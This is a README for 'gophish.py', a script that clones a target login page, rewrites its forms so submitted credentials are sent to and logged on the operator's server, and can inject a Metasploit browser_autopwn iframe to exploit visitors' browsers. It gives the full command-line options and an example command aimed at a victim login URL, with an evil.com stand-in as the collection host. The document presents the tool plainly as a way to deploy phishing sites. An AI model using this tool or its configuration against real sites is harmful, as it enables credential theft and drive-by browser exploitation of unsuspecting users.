gophish
=======

GoPhish is a phishing script that enables rapid deployment of phishing sites.

Requirements
============
Mechanize
CherryPy
BeautifulSoup

Usage
=====

gophish.py [-h] --phish PHISH --replace REPLACE [--logfile LOGFILE]
                  [--listen LISTEN] [--port PORT] [--ssl]
                  [--sslchain SSLCHAIN] [--sslcert SSLCERT] [--sslkey SSLKEY]
                  [--autopwn AUTOPWN] [--autofill AUTOFILL]
                  [--redirect REDIRECT] [--redirectto REDIRECTTO]
                  [--landing LANDING] [--clickthrough CLICKTHROUGH]
                  [--clickable CLICKABLE] [--useragent USERAGENT]
                  [--sendcookies]

  Automatically setup a phishing site.

  optional arguments:
  
    -h, --help            show this help message and exit
    
    --phish PHISH         the full URL to phish back to the victim (must include
                          http(s)://) (default: None)
    --replace REPLACE     the IP/FQDN to replace FORM actions with (must include
                          http(s):// and final /) (default: None)
    --logfile LOGFILE     log file to store submitted form values (default:
                          phishlog.txt)
    --listen LISTEN       the IP to bind to (default: 0.0.0.0)
    --port PORT           the port to start the listening web server on
                          (default: 80)
    --ssl                 enable SSL on the running port (default: 0)
    --sslchain SSLCHAIN   certificate chain file to use when ssl option is
                          enabled (default: chain.crt)
    --sslcert SSLCERT     certificate file to use to use when ssl option is
                          enabled (default: ssl.crt)
    --sslkey SSLKEY       private key file to use to use when ssl option is
                          enabled (default: ssl.key)
    --autopwn AUTOPWN     Metasploit auxiliary/server/browser_autopwn URL to
                          inject as an iFrame (default: None)
    --autofill AUTOFILL   file to use to autosubmit autocomplete fields
                          (default: None)
    --redirect REDIRECT   redirect requests for this address somewhere else
                          (default: None)
    --redirectto REDIRECTTO
                          redirect requests in the redirect option to this
                          address (full link, must include http(s)://) (default:
                          www.google.com)
    --landing LANDING     redirect to this landing page instead of original site
                          after form is submitted (include full link) (default:
                          None)
    --clickthrough CLICKTHROUGH
                          file to serve up after user enters form credentials on
                          main phish page (default: None)
    --clickable CLICKABLE
                          used in combination with clickthrough, comma separated
                          list of files to serve based on requested name
                          (default: None)
    --useragent USERAGENT
                          file to use to pass a user agent value in the request
                          (default: None)
    --sendcookies         initiate a connection, get the cookies, send cookies
                          back in second connection (default: 1)

  Example: gophish.py --phish https://www.victim.com/login.php --replace
    https://www.evil.com/ --port 443 --ssl --sslchain chain.crt --sslcert ssl.crt
    --sslkey ssl.key
